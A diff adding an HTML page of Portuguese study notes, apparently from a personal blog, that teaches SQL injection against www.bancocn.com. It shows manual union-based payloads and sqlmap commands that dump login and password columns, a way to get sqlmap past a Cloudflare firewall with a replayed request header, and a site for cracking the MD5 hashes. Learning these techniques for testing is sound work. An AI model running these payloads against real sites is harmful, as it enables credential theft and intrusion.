@@ -1,0 +1,109 @@
+<!doctype html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Ovo&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="shortcut icon" href="../../anexos/icons/logoCircle64.png"/>
+    <link rel="stylesheet" href="../estilo2.css">
+    <title>Mateus Notes</title>
+</head>
+<body id="fundo">
+<div class="container-fluid">
+
+
+    <div class="row">
+        <div class="col-sm-12" id="menu">
+            <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+                <a id="serifada" class="navbar-brand" href="../../../artigos/seguranca/index2.html">UB Social - Voltar</a>
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
+                <div class="collapse navbar-collapse" id="navbarNav">
+                </div>
+            </nav>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="col-sm-12" id="titulo1">
+            <h1>SQL Injection</h1>
+            <h6><strong>SQL Injection manual e automatizado com Sqlmap</strong></h6>
+        </div>
+
+        <div class="col-sm-12">
+            <h4>Union Based</h4>
+            <p id="textoPost">Unir outras queries àquela brecha encontrada. Geralmente ferramentas de SQL Injection não têm efetividade contra sites controlados por firewall, tendo então que as operações sejam manuais. As 2 principais ferramentas de SQL Injetcion são o Sqlmap e Havij.</p>
+            <br>
+            <h4>Quantas colunas possuem a table do site</h4>
+            <p id="textoPost">Ir trocando o 1 (nº da coluna da table) no final até dar um erro SQL na página, para descobrir quantas colunas possuem a tabela representada. Atenção, não são as linhas, mas sim as colunas de uma table:</p>
+<small><pre id="codigo"><code>
+www.bancocn.com/cat.php?id=1 order by 1--
+</code></pre></small>
+            <br>
+            <h4>Concatenar Selects</h4>
+            <p id="textoPost">Cria-se, após fazer o 1º select, um novo ‘select’, no caso abaixo, com 3 colunas, sendo especificado o valor 1 na primeira coluna, 2 na segunda e 3 na terceira. Caso colocarmos um 4 após o 3, ocorrerá o mesmo erro que o acima, informando que não existe uma quarta coluna. Pode-se trocar os nºs por outros dados, como Strings.</p>
+<small><pre id="codigo"><code>
+www.bancocn.com/cat.php?id=1 union select 1, 2, 3
+www.bancocn.com/cat.php?id=-1 union select 1, 2, 3 (Ver conteúdo da 3ª coluna)
+www.bancocn.com/cat.php?id=-1 union select 1, 2, database() //nome do database
+</code></pre></small>
+            <br>
+            <h4>Database padrão MySQL</h4>
+            <p id="textoPost">Dentro da table schemata estão os nomes dos Databases existentes (schema_name). Schema é o mesmo que Database. No caso, existem mais Databases cadastrados, porém o usuário de acesso do Database não possui permissões de acesso.</p>
+<small><pre id="codigo"><code>
+www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(schema_name) from information_schema.schemata
+<b>Nome das tables:</b>
+www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=”bancocn”
+<b>Nome das columns:</b>
+www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(column_name) from information_schema.columns where table_schema=”bancocn” and table_name=”users”
+</code></pre></small>
+            <br>
+            <h4>Dados das Columns</h4>
+<small><pre id="codigo"><code>
+www.bancocn.com/cat.php?id=-1 union select 1, 2, login from bancocn.users
+www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(id, “ ”, login, “ ”, password) from bancocn.users
+</code></pre></small>
+            <br>
+            <h4>Remover criptografia MD5</h4>
+            <p id="textoPost">Site https://hashes.com/en/decrypt/hash</p>
+            <br>
+            <hr>
+            <h4>Sqlmap</h4>
+<small><pre id="codigo"><code>
+sqlmap -u http://www.bancocn.com/cat.php?id=3 --dbs --dbms=mysql
+</code></pre></small>
+            <p id="textoPost">Ocorrerá um erro 403, pois o firewall Cloudflare barra a ferramenta. A solução para tal é inserir um Request Header que já fora autorizado pelo firewall, e salvá-lo em um arquivo txt (no caso, header.txt, imagem abaixo). Após isso, utiliza-se o seguinte comando.</p>
+<small><pre id="codigo"><code>
+sqlmap -r lista.txt --dbs --dbms=mysql
+</code></pre></small>
+            <img src="../anexos1/posta5/header.png" class="img-fluid">
+            <br><br>
+            <img src="../anexos1/posta5/listatxt.png" class="img-fluid">
+            <br><br>
+            <img src="../anexos1/posta5/sqlmap.png" class="img-fluid">
+            <br><br>
+<small><pre id="codigo"><code>
+<b>Nome das tables:</b>
+sqlmap -r lista.txt --dbms=mysql -D bancocn --tables
+<b>Columns da table:</b>
+sqlmap -r lista.txt --dbms=mysql -D bancocn -T users --columns
+<b>Dados das columns:</b>
+sqlmap -r lista.txt --dbms=mysql -D bancocn -T users -C login,password --dump
+</code></pre></small>
+            <img src="../anexos1/posta5/sqlmap2.png" class="img-fluid">
+            <br><br>
+            <img src="../anexos1/posta5/sqlmap3.png" class="img-fluid">
+            <br><br>
+            <img src="../anexos1/posta5/sqlmap4.png" class="img-fluid">
+            <br><br>
+        </div>
+    </div>
+
+
+</div>
+</body>
+</html>
